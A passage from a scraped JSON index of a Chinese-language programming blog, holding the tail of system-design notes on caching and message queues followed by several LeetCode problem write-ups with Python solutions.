無法準確預測未來會使用的資料時，會導致性能降低，還不如使用其他模式 缺點 需要保持快取和資料庫之間資料的一致性，比如說要如何設定 快取無效 需要更改應用程式程式碼來支援像是 Redis 或 Memcached 等快取服務 快取的無效性是個難題，而什麼時候要更新快取就是個對應的複雜問題 非同步機制 訊息佇列 訊息佇列用來接收、保留以及傳遞訊息 使用者不會被阻塞，同時工作會在背景完成 Backpressure 當佇列開始明顯成長時，佇列的大小可能會超過記憶體，這會導致無法命中快取 背壓 可以用來限制佇列的大小，讓佇列保持高吞吐率和良好的回應時間 一旦佇列滿了，客戶端將會得到 HTTP 503 的回應碼，以便讓他們在稍後重新嘗試 缺點 簡單的運算和需要即時的工作可能更適合使用同步運算，導入佇列可能會增加延遲或系統複雜度 訊息可能不會照發送順序完成 想想TCP為什麼需要ACK 同樣的訊息被重複處理 通常訊息佇列會讓處理失敗的訊息重新入列 (扣款?) Ref source\n","permalink":"https://littlebees.github.io/2021/01/system-design-primer%E7%AD%86%E8%A8%98-%E5%B7%A5%E5%85%B7%E7%AF%87/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e會知道system design primer是因為某場面試，原本以為system design在網路上沒有什麼資料\u003c/p\u003e\n\u003cp\u003e結果是很多資料，但是system design資料會多，很大一部分是system design包含的面向很廣\u003c/p\u003e\n\u003cp\u003e所以來整理一下，作為了解的開始\u003c/p\u003e\n\u003cp\u003e這篇是介紹會用到的工具，接下來是設計\n但設計還要帶一下估計的方法與常用數字\u003c/p\u003e\n\u003cp\u003e所以之後還有兩篇要整理\u003c/p\u003e","title":"system design primer筆記 工具篇"},{"content":"動機 在dp中看到mutual recursion\n這裡不管效率，都是用top-down的方式寫，除了最終版本\n這應該是繼burst ballon之後看過最有趣的DP了\nProblem You are given an integer array prices where prices[i] is the price of a given stock on the ith day, and an integer k.\nFind the maximum profit you can achieve. You may complete at most k transactions.\nNote: You may not engage in multiple transactions simultaneously (i.e., you must sell the stock before you buy again).\nExample 1:\nInput: k = 2, prices = [2,4,1]Output: 2Explanation: Buy on day 1 (price = 2) and sell on day 2 (price = 4), profit = 4-2 = 2.Example 2:\nInput: k = 2, prices = [3,2,6,5,0,3]Output: 7Explanation: Buy on day 2 (price = 2) and sell on day 3 (price = 6), profit = 6-2 = 4. Then buy on day 5 (price = 0) and sell on day 6 (price = 3), profit = 3-0 = 3. Constraints:\n0 \u003c= k \u003c= 1000 \u003c= prices.length \u003c= 10000 \u003c= prices[i] \u003c= 1000 Sol Ver1: DP O(N^2) (TLE) 定義f(i,k)為 在第i天還有k次交易額度下的最大利潤\n這樣每次都要往[0,i)去找最大利潤，有沒有方法把這個壓成常數\nclass Solution: @functools.cache def f(self, i, k): if k == 0 or i \u0026lt;= 0: return 0 else: return max([max(self.f(j,k-1)+max(0,self.ps[i]-self.ps[j]),self.f(j,k)) for j in range(i)]) def maxProfit(self, k: int, prices: List[int]) -\u0026gt; int: self.ps = prices return self.f(len(prices)-1, k) Sol Ver2: DP O(N*k) 起終點分離 如果每次都要算出每段的利潤，自然要每個點都要試\n但是如果把每段拆成負的起點與終點的加總，就不用每個點都試\n能拆的理由是每一段不會overlap，一段一定是發生在一段之後\nVer1 定義 f(i,k,can_buy)為 在第i天還有k次交易額度 can_buy(可以買股票) 下的最大收益\n@functools.cache def f(self, i, k, can_buy): if k == 0 or i == 0: return 0 if not can_buy else -self.ps[i] elif i \u0026lt; 0 or k \u0026lt; 0: return -math.inf else: if can_buy: return max(self.f(i-1, k, True), self.f(i-1, k-1, False) - self.ps[i]) else: return max(self.f(i-1, k, False), self.f(i-1, k, True) + self.ps[i]) def maxProfit(self, k: int, prices: List[int]) -\u0026gt; int: if not prices or k is 0: return 0 self.ps = prices return max([self.f(len(prices)-1,k,False) for j in range(k)]) Ver2 不可以買股票 可以當成要算 售出 的最大收益\n可以買股票 可以當成要算 購入 的最大收益\n故可以拆成兩個function做mutual recursion\n@functools.cache def buy(self,i,k): #print(\u0026#34;buy\u0026#34;, i, k) if k \u0026lt;= 0 or i \u0026lt; 0: ret = -math.inf else: ret = max(self.buy(i-1,k), self.sell(i-1,k-1)-self.ps[i]) #print(\u0026#34;buy\u0026#34;, i, k, ret) return ret @functools.cache def sell(self,i,k): #print(\u0026#34;sell\u0026#34;, i, k) if i \u0026lt;= 0 or k \u0026lt;= 0: ret = 0 else: ret = max(self.sell(i-1,k), self.buy(i,k)+self.ps[i]) #print(\u0026#34;sell\u0026#34;, i, k, ret) return ret def maxProfit(self, k: int, prices: List[int]) -\u0026gt; int: if not prices or k is 0: return 0 if k*2 \u0026gt; len(prices): return self.infTimes(prices) self.ps = prices return self.sell(len(prices)-1, k) 挑區段 a~b + b~c = a~c 所以可以一直把區段接起來，直到最大 用這種方式來看，可以把k看成 最多可以挑(保留)幾次到目前為止已經接好的區段\n定義 localF 為 在第i天還有k次保留機會時接上i-1~i的最大收益 定義 globalF 為 在第i天還有k次保留機會時的最大收益\n@functools.cache def localF(self,i,k): if i == 0 and k == 0: return 0 elif k == 0: return -self.ps[i] elif i == 0: return 0 else: return max(self.globalF(i-1,k-1), self.localF(i-1,k))+(self.ps[i]-self.ps[i-1]) @functools.cache def globalF(self,i,k): if i \u0026lt; 0 or k \u0026lt; 0: return 0 else: return max(self.globalF(i-1,k), self.localF(i,k)) def maxProfit(self, k: int, prices: List[int]) -\u0026gt; int: self.ps = prices return self.globalF(len(prices)-1,k) 湊區段 (最終版本) 到現在，其實這題的重點是在第i天的最大收益是可以來自\n同一個前一天的區段 (可以接) 歷史最大收益 (可能是可以接，也可能是不能接) 所以可以用k一次一次擴大區段的嘗試\n定義 val 為\n前一天的最大收益(不能接)或連續區段的最大收益(可以接) 加上 當前的區段 (當次) 或是 歷史上當天的最大收益 (前幾次的) 之間的最大值\n定義 pnl 為 歷史上第i天的最大收益\nclass Solution: def maxProfit(self, k: int, prices: List[int]) -\u0026gt; int: if 2*k \u0026gt;= len(prices): return sum(max(0, prices[i]-prices[i-1]) for i in range(1, len(prices))) pnl = [0]*len(prices) for _ in range(k): val = 0 for i in range(1, len(pnl)): val = max(pnl[i], val + prices[i] - prices[i-1]) # val is pnl[i-1] or val pnl[i] = max(pnl[i-1], val) return pnl[-1] ","permalink":"https://littlebees.github.io/2021/01/leetcode-188-best-time-to-buy-and-sell-stock-iv/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e在dp中看到mutual recursion\u003c/p\u003e\n\u003cp\u003e這裡不管效率，都是用top-down的方式寫，除了最終版本\u003c/p\u003e\n\u003cp\u003e這應該是繼burst ballon之後看過最有趣的DP了\u003c/p\u003e","title":"leetcode-188 - Best Time to Buy and Sell Stock IV"},{"content":"動機 水題\nProblem Given an integer array nums, return true if any value appears at least twice in the array, and return false if every element is distinct.\nExample 1:\nInput: nums = [1,2,3,1]Output: trueExample 2:\nInput: nums = [1,2,3,4]Output: falseExample 3:\nInput: nums = [1,1,1,3,3,4,3,2,4,2]Output: true Constraints:\n1 \u003c= nums.length \u003c= 105-109 \u003c= nums[i] \u003c= 109 Sol 用Counter可以計數!! 不用自己刻!!\nclass Solution: def containsDuplicate(self, nums: List[int]) -\u0026gt; bool: if not nums: return False return max(Counter(nums).values()) \u0026gt; 1 ","permalink":"https://littlebees.github.io/2021/01/leetcode-217-contains-duplicate/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e水題\u003c/p\u003e","title":"leetcode-217 - Contains Duplicate"},{"content":"動機 這應該可以用5進位制來看，但要先把數論找回來\nProblem Given an integer n, return the number of trailing zeroes in n!.\nFollow up: Could you write a solution that works in logarithmic time complexity?\nExample 1:\nInput: n = 3Output: 0Explanation: 3! = 6, no trailing zero.Example 2:\nInput: n = 5Output: 1Explanation: 5! = 120, one trailing zero.Example 3:\nInput: n = 0Output: 0 Constraints:\n0 \u003c= n \u003c= 104 Sol Ver1 找10的因數\ndef f(val,n): ret = 0 while val % n == 0: val = val // n ret += 1 return ret class Solution: def trailingZeroes(self, n: int) -\u0026gt; int: two = 0 five = 0 for k in range(1,n+1): two += f(k,2) five += f(k,5) return min(two,five) Sol Ver2 2一定比5多\ndef f(val,n): ret = 0 while val % n == 0: val = val // n ret += 1 return ret class Solution: def trailingZeroes(self, n: int) -\u0026gt; int: two = 0 five = 0 for k in range(1,n+1): #two += f(k,2) five += f(k,5) return five #min(two,five) Sol Ver3 把數字列出來，會看到每5個就會有5 所以就一直除5把商都加起來\n1 2 3 4 5 6 7 8 9 (2*5) 11 12 13 14 (3*5) ... 21 22 23 24 (5*5) 25 // 5 = 5 5 // 5 = 1 class Solution: def trailingZeroes(self, n: int) -\u0026gt; int: five = 0 while n \u0026gt;= 5: five += n // 5 n = n // 5 return five ","permalink":"https://littlebees.github.io/2021/01/leetcode-172-factorial-trailing-zeroes/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這應該可以用5進位制來看，但要先把數論找回來\u003c/p\u003e","title":"leetcode-172 - Factorial Trailing Zeroes"},{"content":"動機 讓我想起之前看有binary search的LIS，多看真的會有靈感\nProblem Given an integer array nums, return true if there exists a triple of indices (i, j, k) such that i \u003c j \u003c k and nums[i] \u003c nums[j] \u003c nums[k]. If no such indices exists, return false.\nExample 1:\nInput: nums = [1,2,3,4,5]Output: trueExplanation: Any triplet where i \u003c j \u003c k is valid.Example 2:\nInput: nums = [5,4,3,2,1]Output: falseExplanation: No triplet exists.Example 3:\nInput: nums = [2,1,5,0,4,6]Output: trueExplanation: The triplet (3, 4, 5) is valid because nums[3] == 0 \u003c nums[4] == 4 \u003c nums[5] == 6. Constraints:\n1 \u003c= nums.length \u003c= 5 * 105-231 \u003c= nums[i] \u003c= 231 - 1 Follow up: Could you implement a solution that runs in O(n) time complexity and O(1) space complexity? Sol 因為只要找有沒有 A \u0026lt; B \u0026lt; C 所以 同時這個目標是遞迴的!!\n所以就是從頭到尾一直更新剛好最接近的位置，同時判斷有沒有塞滿就好\nclass Solution: def increasingTriplet(self, nums: List[int], startFrom=0) -\u0026gt; bool: acc = [-math.inf]*3 acc[0] = nums[0] for i in range(1,len(nums)): for j in range(3): if acc[j] == -math.inf or acc[j] \u0026gt;= nums[i]: acc[j] = nums[i] break if acc[2] != -math.inf: return True return False ","permalink":"https://littlebees.github.io/2021/01/leetcode-334-increasing-triplet-subsequence/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e讓我想起之前看有binary search的LIS，多看真的會有靈感\u003c/p\u003e","title":"leetcode-334 - Increasing Triplet Subsequence"},{"content":"動機 原來binary search可以這麼用\nProblem Given an n x n matrix where each of the rows and columns are sorted in ascending order, return the kth smallest element in the matrix.\nNote that it is the kth smallest element in the sorted order, not the kth distinct element.\nExample 1:\nInput: matrix = [[1,5,9],[10,11,13],[12,13,15]], k = 8Output: 13Explanation: The elements in the matrix are [1,5,9,10,11,12,13,13,15], and the 8th smallest number is 13Example 2:\nInput: matrix = [[-5]], k = 1Output: -5 Constraints:\nn == matrix.lengthn == matrix[i].length1 \u003c= n \u003c= 300-109 \u003c= matrix[i][j] \u003c= 109All the rows and columns of matrix are guaranteed to be sorted in non-decreasing order.1 \u003c= k \u003c= n2 Sol1: divide-and-conquer 當初想說對半折就好，但是這會把應該找的也一起砍掉\ndef g(val): return (val+(0 if val % 2 == 0 else 1))//2 def f(ms,k,i,j,li,lj): #print(k,i,j,li,lj) if k \u0026lt;= 1: return ms[i][j] else: if k \u0026gt;= (li*lj)//2: if li \u0026gt; 1 and lj \u0026gt; 1: if ms[i][j+1] \u0026lt;= ms[i+1][j]: tmp = g(li) k -= min(1,li-tmp)*lj return f(ms, k ,i+li//2 ,j , tmp , lj) else: tmp = g(lj) k -= (lj-tmp)*li return f(ms, k ,i ,j+lj//2 , li, tmp) elif li \u0026gt; 1: tmp = g(li) k -= (li-tmp)*lj return f(ms, k ,i+li//2 ,j , tmp , lj) else: tmp = g(lj) k -= (lj-tmp)*li return f(ms, k ,i ,j+lj//2 , li, tmp) else: if li \u0026gt; 1 and lj \u0026gt; 1: if ms[i][j+1] \u0026lt;= ms[i+1][j]: tmp = g(li) return f(ms, k ,i , j, tmp , lj) else: tmp = g(lj) return f(ms, k ,i , j, li, tmp) elif li \u0026gt; 1: tmp = g(li) return f(ms, k ,i , j, tmp , lj) else: tmp = g(lj) return f(ms, k ,i , j, li, tmp) class Solution: def kthSmallest(self, ms: List[List[int]], k: int) -\u0026gt; int: return f(ms,k,0,0,len(ms),len(ms)) Sol2: binary search + binary search 第一個binary search在matrix的最大與最小的範圍中找個數字，依據數字的排名做二分 第二個binary search在每個row找總共有多少數字小於等於(upper bound)現在猜的數字\ndef count(ms,v): ret = 0 exist = False for m in ms: tmp = bisect.bisect(m,v) ret += tmp if tmp \u0026gt; 0: exist = exist or m[tmp-1] == v return [ret, exist] def check(k,n,exist): return n\u0026gt;=k and exist class Solution: def kthSmallest(self, ms: List[List[int]], k: int) -\u0026gt; int: i = ms[0][0] j = ms[-1][-1] exist = False while i \u0026lt; j: mid = i + (j-i)//2 tmp, exist = count(ms,mid) if tmp \u0026gt;= k: j = mid else: i = mid+1 return i Sol3: binary search + saddleback 利用saddleback的想法，從左下走\n如果比猜的數字大，往上以及加總這排的小於等於的總數 如果比猜的數字小，往右走\n不過要注意，不要往右走到超過邊界\ndef count(ms,v): ret = 0 i = len(ms)-1 j = 0 while 0 \u0026lt;= i: if j == len(ms) or ms[i][j] \u0026gt; v: ret += j i -= 1 else: j += 1 return ret def check(k,n,exist): return n\u0026gt;=k and exist class Solution: def kthSmallest(self, ms: List[List[int]], k: int) -\u0026gt; int: i = ms[0][0] j = ms[-1][-1] exist = False while i \u0026lt; j: mid = i + (j-i)//2 tmp = count(ms,mid) if tmp \u0026gt;= k: j = mid else: i = mid+1 return i ","permalink":"https://littlebees.github.io/2021/01/leetcode-378-kth-smallest-element-in-a-sorted-matrix/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原來binary search可以這麼用\u003c/p\u003e","title":"leetcode-378 - Kth Smallest Element in a Sorted Matrix"},{"content":"動機 這題讓我把binary編碼與complete binary tree的關係找回來了\nProblem Given a binary tree with the following rules:\nroot.val == 0If treeNode.val == x and treeNode.left != null, then treeNode.left.val == 2 * x + 1If treeNode.val == x and treeNode.right != null, then treeNode.right.val == 2 * x + 2Now the binary tree is contaminated, which means all treeNode.val have been changed to -1.\nImplement the FindElements class:\nFindElements(TreeNode* root) Initializes the object with a contaminated binary tree and recovers it.bool find(int target) Returns true if the target value exists in the recovered binary tree. Example 1:\nInput[FindElements,find,find][[[-1,null,-1]],[1],[2]]Output[null,false,true]ExplanationFindElements findElements = new FindElements([-1,null,-1]); findElements.find(1); // return False findElements.find(2); // return True Example 2:\nInput[FindElements,find,find,find][[[-1,-1,-1,-1,-1]],[1],[3],[5]]Output[null,true,true,false]ExplanationFindElements findElements = new FindElements([-1,-1,-1,-1,-1]);findElements.find(1); // return TruefindElements.find(3); // return TruefindElements.find(5); // return FalseExample 3:\nInput[FindElements,find,find,find,find][[[-1,null,-1,-1,null,-1]],[2],[3],[4],[5]]Output[null,true,false,false,true]ExplanationFindElements findElements = new FindElements([-1,null,-1,-1,null,-1]);findElements.find(2); // return TruefindElements.find(3); // return FalsefindElements.find(4); // return FalsefindElements.find(5); // return True Constraints:\nTreeNode.val == -1The height of the binary tree is less than or equal to 20The total number of nodes is between [1, 104]Total calls of find() is between [1, 104]0 \u003c= target \u003c= 106 Sol1: DFS (TLE) 兩邊都走，當然就超時啦 明明就有數字可以決定走哪\ndef dfs(r,n=0): if r: r.val = n dfs(r.left,2*n+1) dfs(r.right,2*n+2) class FindElements: def ff(self, target, tmp): if not tmp: return False elif tmp.val == target: return True else: return self.ff(target, tmp.left) or self.ff(target, tmp.right) def __init__(self, root: TreeNode): dfs(root) self.root = root def find(self, target: int) -\u0026gt; bool: return self.ff(target, self.root) Sol2: Hash (AC) 都會走dfs，就把數字存到hash就好了\nclass FindElements: def ff(self,root, acc=0): if root: self.tbl.add(acc) self.ff(root.left,acc*2+1) self.ff(root.right,acc*2+2) def __init__(self, root: TreeNode): self.tbl = set() self.ff(root) def find(self, target: int) -\u0026gt; bool: return target in self.tbl Sol3: Binary (AC) 觀察編碼與節點的對應是 2^depth-1\n所以可以先加1，轉成binary，從倒數第二個數字開始往頭走(reverse order)\n像5為例\n5+1 = 6 6 = 110 10 =\u0026gt; left, right class FindElements: def dfs(self, s, i, r): if not r: return False elif i \u0026gt;= len(s): return r is not None else: if s[i] == \u0026#39;0\u0026#39;: return self.dfs(s,i+1,r.left) else: return self.dfs(s,i+1,r.right) def __init__(self, root: TreeNode): self.r = root def find(self, target: int) -\u0026gt; bool: target += 1 s = format(target,\u0026#39;b\u0026#39;) return self.dfs(s[1:], 0, self.r) Ref Binary的詳解\n","permalink":"https://littlebees.github.io/2021/01/leetcode-1261-find-elements-in-a-contaminated-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題讓我把binary編碼與complete binary tree的關係找回來了\u003c/p\u003e","title":"leetcode-1261 - Find Elements in a Contaminated Binary Tree"},{"content":"動機 當初想的太複雜了，還想用兩個heap\nProblem Design a class to find the kth largest element in a stream. Note that it is the kth largest element in the sorted order, not the kth distinct element.\nImplement KthLargest class:\nKthLargest(int k, int[] nums) Initializes the object with the integer k and the stream of integers nums.int add(int val) Returns the element representing the kth largest element in the stream. Example 1:\nInput[KthLargest, add, add, add, add, add][[3, [4, 5, 8, 2]], [3], [5], [10], [9], [4]]Output[null, 4, 5, 5, 8, 8]ExplanationKthLargest kthLargest = new KthLargest(3, [4, 5, 8, 2]);kthLargest.add(3); // return 4kthLargest.add(5); // return 5kthLargest.add(10); // return 5kthLargest.add(9); // return 8kthLargest.add(4); // return 8 Constraints:\n1 \u003c= k \u003c= 1040 \u003c= nums.length \u003c= 104-104 \u003c= nums[i] \u003c= 104-104 \u003c= val \u003c= 104At most 104 calls will be made to add.It is guaranteed that there will be at least k elements in the array when you search for the kth element. Sol Min heap保持最多k個\nclass KthLargest: def __init__(self, k: int, nums: List[int]): self.minh = nums self.k = k heapify(self.minh) while len(self.minh) \u0026gt; k: heappop(self.minh) def add(self, val: int) -\u0026gt; int: heappush(self.minh,val) #print(self.minh, \u0026#34;=\u0026gt;\u0026#34;) if len(self.minh) \u0026gt; self.k: heappop(self.minh) #print(self.minh) return self.minh[0] ","permalink":"https://littlebees.github.io/2021/01/leetcode-703-kth-largest-element-in-a-stream/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當初想的太複雜了，還想用兩個heap\u003c/p\u003e","title":"leetcode-703 - Kth Largest Element in a Stream"},{"content":"動機 Problem Given a string s containing only three types of characters: '(', ')' and '*', return true if s is valid.\nThe following rules define a valid string:\nAny left parenthesis '(' must have a corresponding right parenthesis ')'.Any right parenthesis ')' must have a corresponding left parenthesis '('.Left parenthesis '(' must go before the corresponding right parenthesis ')'.'*' could be treated as a single right parenthesis ')' or a single left parenthesis '(' or an empty string . Example 1:\nInput: s = ()Output: trueExample 2:\nInput: s = (*)Output: trueExample 3:\nInput: s = (*))Output: true Constraints:\n1 \u003c= s.length \u003c= 100s[i] is '(', ')' or '*'. Sol 重點是怎麼處理星號，\n左括號只能和他之後的星號配對 右括號只能和他之前的星號配對 class Solution: def checkValidString(self, s: str) -\u0026gt; bool: left = [] star = [] right = [] for i in range(len(s)): if s[i] == \u0026#39;*\u0026#39;: star.append(i) elif s[i] == \u0026#39;(\u0026#39;: left.append(i) else: if left: left.pop() elif star: star.pop() else: right.append(i) print(left,star,right) if left: while left and star and left[-1] \u0026lt; star[-1]: left.pop() star.pop() elif right: while right and star and star[-1] \u0026lt; right[-1]: right.pop() star.pop() print(left,star,right) return not left and not right case study 把所有星號當成左括號，去計數，如果左括號太少，就直接False 把所有星號當成右括號，去計數，全部跑完，看有沒有被扣完 (多扣沒關係，因為在第一條已經證明左括號+星號一定足夠匹配真正的右括號) class Solution: def checkValidString(self, s: str) -\u0026gt; bool: cmin = cmax = 0 for c in s: cmax = cmax - 1 if c == \u0026#39;)\u0026#39; else cmax + 1 cmin = cmin + 1 if c == \u0026#39;(\u0026#39; else max(cmin - 1, 0) if cmax \u0026lt; 0: return False return cmin == 0 ","permalink":"https://littlebees.github.io/2021/01/leetcode-678-valid-parenthesis-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"leetcode-678 - Valid Parenthesis String"},{"content":"動機 簡單一點也不是壞事，至少算index到找到一個完整的方式去處理之前\nProblem Given an array of non-negative integers nums, you are initially positioned at the first index of the array.\nEach element in the array represents your maximum jump length at that position.\nYour goal is to reach the last index in the minimum number of jumps.\nYou can assume that you can always reach the last index.\nExample 1:\nInput: nums = [2,3,1,1,4]Output: 2Explanation: The minimum number of jumps to reach the last index is 2. Jump 1 step from index 0 to 1, then 3 steps to the last index.Example 2:\nInput: nums = [2,3,0,1,4]Output: 2 Constraints:\n1 \u003c= nums.length \u003c= 1040 \u003c= nums[i] \u003c= 1000 Sol1: DP (TLE) 原本是用DP往回刷，當然超時\nclass Solution: @functools.cache def f(self,i): if i == 0: return 0 else: return min([self.f(j) for j in range(0, i) if (i-j) \u0026lt;= self.nums[j]])+1 def jump(self, nums: List[int]) -\u0026gt; int: self.nums = nums #[print(self.f(x)) for x in range(0,len(nums))] return self.f(len(nums)-1) Sol1.5: Wrong Greedy (\u0026hellip;) 在可跳躍去區間中，找最大的位置 根據選出來的位置，去算可以忽略(該點到區間的終點)的距離 但是一直出事，吃WA，一直沒實作好\u0026hellip;\nclass Solution: def jump(self, nums: List[int]) -\u0026gt; int: i = 0 seen=0 ans = 0 while i \u0026lt; len(nums)-1: if nums[i] == 1: max_i = i + 1 seen = 0 else: if i+nums[i]+1+seen \u0026gt;= len(nums): max_i = len(nums) else: sub = nums[i+1+seen:i+nums[i]+1+seen] #print(sub) if sub: max_i = i+seen+1+max(reversed(range(len(sub))), key=sub.__getitem__) seen = nums[i] - max_i else: max_i = i+seen+1 seen = 0 i = max_i ans += 1 #print(i,seen,ans) return ans Sol2: Greedy (AC) 只包留第一條，但改一下\n在可跳躍去區間中，找能跳出去的最大位置 這裡有個Python Trick，就是去找最大值的index\nmax(range(len(sub)), key=sub.__getitem__)\nclass Solution: def jump(self, nums: List[int]) -\u0026gt; int: i = 0 ans = 0 while i \u0026lt; len(nums)-1: if nums[i] == 1: max_i = i + 1 else: if i+nums[i]+1 \u0026gt;= len(nums): max_i = len(nums) else: sub = [j for j in range(i+1,i+nums[i]+1) if j \u0026lt; len(nums)] #print(sub) if sub: sub = [nums[j]-(i+nums[i]+1-j) for j in sub] max_i = i+1+max(range(len(sub)), key=sub.__getitem__) else: max_i = i+1 i = max_i ans += 1 #print(i,ans) return ans ","permalink":"https://littlebees.github.io/2021/01/leetcode-45-jump-game-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e簡單一點也不是壞事，至少算index到找到一個完整的方式去處理之前\u003c/p\u003e","title":"leetcode-45 - Jump Game II"},{"content":"動機 整理一下\n1. [first, last) 左右 * 閉開 =\u0026gt; 4種\n假設長度為4的array，範圍如下\n0 \u0026lt;= x \u0026lt; 4 0 \u0026lt;= x \u0026lt;= 3 -1 \u0026lt; x \u0026lt;= 3 -1 \u0026lt; x \u0026lt; 4 如果bsearch到最後，左右兩邊重合\n0 \u0026lt;= x \u0026lt; 0 0 \u0026lt;= x \u0026lt;= -1 -1 \u0026lt; x \u0026lt;= -1 -1 \u0026lt; x \u0026lt; 0 所以我們還是選第一種左閉右開\n因此，終止條件是\nwhile i \u0026lt; j: pass 2. mid = first + (last - first) // 2 原本算中點是(last + first)//2，但是有可能會加到溢位!!\n改成用起點再加上多的部分\n記得，中點就是往開去算，故如果變成右閉左開要用 last - (last-first)//2去算\n另外注意，這裡是無條件捨去，另外有無條件進位的中點算法，但我還不知道使用上要怎麼選擇，但有遇過因此被婊的時候\n3. first = mid + 1, last = mid 參考文中是用歸納法(那個loop invariant與我印象中的loop invariant不一樣，所以先叫他歸納法)去證為什麼是first = mid + 1, last = mid\n但這裡用終止條件的來看，為什麼是first = mid + 1, last = mid\n我們的終止條件左閉右開，所以之後的first與last都要左閉右開\n因為mid看過了不用保留所以first = mid + 1，那last呢? 右邊是開，所以last = mid\n等到了搜尋完成，最後的結果會是last == first，所以在最後last的值會連同first被保留，十分有趣。\n總結 再一次，去看參考的文章，必看阿!!!\ndef lower_bound(array, first, last, value): # 求非降序范围[first, last)内第一个不小于value的值的位置 while first \u0026lt; last: # 搜索区间[first, last)不为空 mid = first + (last - first) // 2 # 防溢出 if array[mid] \u0026lt; value: first = mid + 1 else: last = mid return first # last也行，因为[first, last)为空的时候它们重合 Ref 炒讚，快去看\n","permalink":"https://littlebees.github.io/2020/12/binary-search%E6%9C%80%E4%BD%B3%E5%AF%A6%E8%B8%90/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e整理一下\u003c/p\u003e","title":"binary-search最佳實踐"},{"content":"動機 當初了解定義花了很久時間\nProblem Given an array of integers citations where citations[i] is the number of citations a researcher received for their ith paper, return compute the researcher's h-index.\nAccording to the definition of h-index on Wikipedia: A scientist has an index h if h of their n papers have at least h citations each, and the other n − h papers have no more than h citations each.\nIf there are several possible values for h, the maximum one is taken as the h-index.\nExample 1:\nInput: citations = [3,0,6,1,5]Output: 3Explanation: [3,0,6,1,5] means the researcher has 5 papers in total and each of them had received 3, 0, 6, 1, 5 citations respectively.Since the researcher has 3 papers with at least 3 citations each and the remaining two with no more than 3 citations each, their h-index is 3.Example 2:\nInput: citations = [1,3,1]Output: 1 Constraints:\nn == citations.length1 \u003c= n \u003c= 50000 \u003c= citations[i] \u003c= 1000 Sol wiki定義h-index是前n篇有至少n個引用數而已，但是leetcode題目卻多了剩下的paper的引用數必須小於他\n因為多了這個條件所以煩惱了很久\u0026hellip;\n最後才意識到就是wiki上的定義而已，後面那個是自然就會形成的\nclass Solution: def hIndex(self, cs: List[int]) -\u0026gt; int: if not cs: return 0 heapify(cs) h = len(cs) while cs and heappop(cs) \u0026lt; h: h -= 1 return h ","permalink":"https://littlebees.github.io/2020/12/leetcode-274-h-index/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當初了解定義花了很久時間\u003c/p\u003e","title":"leetcode-274 - H-Index"},{"content":"動機 水題~~\nProblem Given an array of strings strs, group the anagrams together. You can return the answer in any order.\nAn Anagram is a word or phrase formed by rearranging the letters of a different word or phrase, typically using all the original letters exactly once.\nExample 1:\nInput: strs = [eat,tea,tan,ate,nat,bat]Output: [[bat],[nat,tan],[ate,eat,tea]]Example 2:\nInput: strs = []Output: [[]]Example 3:\nInput: strs = [a]Output: [[a]] Constraints:\n1 \u003c= strs.length \u003c= 1040 \u003c= strs[i].length \u003c= 100strs[i] consists of lower-case English letters. Sol sort後再用hash\nclass Solution: def groupAnagrams(self, strs: List[str]) -\u0026gt; List[List[str]]: tbl = {} for s in strs: ss = tuple(sorted(s)) if ss in tbl: tbl[ss].append(s) else: tbl[ss] = [s] return list(tbl.values()) ","permalink":"https://littlebees.github.io/2020/12/leetcode-49-group-anagrams/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e水題~~\u003c/p\u003e","title":"leetcode-49 - Group Anagrams"},{"content":"動機 原來這麼簡單!?\nProblem You are playing the following Nim Game with your friend:\nInitially, there is a heap of stones on the table.You and your friend will alternate taking turns, and you go first.On each turn, the person whose turn it is will remove 1 to 3 stones from the heap.The one who removes the last stone is the winner.Given n, the number of stones in the heap, return true if you can win the game assuming both you and your friend play optimally, otherwise return false.\nExample 1:\nInput: n = 4Output: falseExplanation: These are the possible outcomes:1. You remove 1 stone. Your friend removes 3 stones, including the last stone. Your friend wins.2. You remove 2 stones. Your friend removes 2 stones, including the last stone. Your friend wins.3. You remove 3 stones. Your friend removes the last stone. Your friend wins.In all outcomes, your friend wins.Example 2:\nInput: n = 1Output: trueExample 3:\nInput: n = 2Output: true Constraints:\n1 \u003c= n \u003c= 231 - 1 Sol 拿走最後一顆的贏，一次最多3顆\n如果只有 \u0026lt;=3，那我們會贏 但到了4就會輸，\n接著5~7，只要最後留4個，對面就會輸，但8個的話就是我們出事了\n所以規律就是(3+1)的倍數\nclass Solution: def canWinNim(self, n: int) -\u0026gt; bool: return n%(3+1) ","permalink":"https://littlebees.github.io/2020/12/leetcode-292-nim-game/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原來這麼簡單!?\u003c/p\u003e","title":"leetcode-292 - Nim Game"},{"content":"動機 二分搜怎麼那麼難搞\nProblem A peak element is an element that is strictly greater than its neighbors.\nGiven an integer array nums, find a peak element, and return its index. If the array contains multiple peaks, return the index to any of the peaks.\nYou may imagine that nums[-1] = nums[n] = -∞.\nYou must write an algorithm that runs in O(log n) time.\nExample 1:\nInput: nums = [1,2,3,1]Output: 2Explanation: 3 is a peak element and your function should return the index number 2.Example 2:\nInput: nums = [1,2,1,3,5,6,4]Output: 5Explanation: Your function can return either index number 1 where the peak element is 2, or index number 5 where the peak element is 6. Constraints:\n1 \u003c= nums.length \u003c= 1000-231 \u003c= nums[i] \u003c= 231 - 1nums[i] != nums[i + 1] for all valid i. Sol 根據bsearch的best practice，終止條件用左閉右合\n那搜尋區間怎麼給? 左邊給0，右邊給多少? 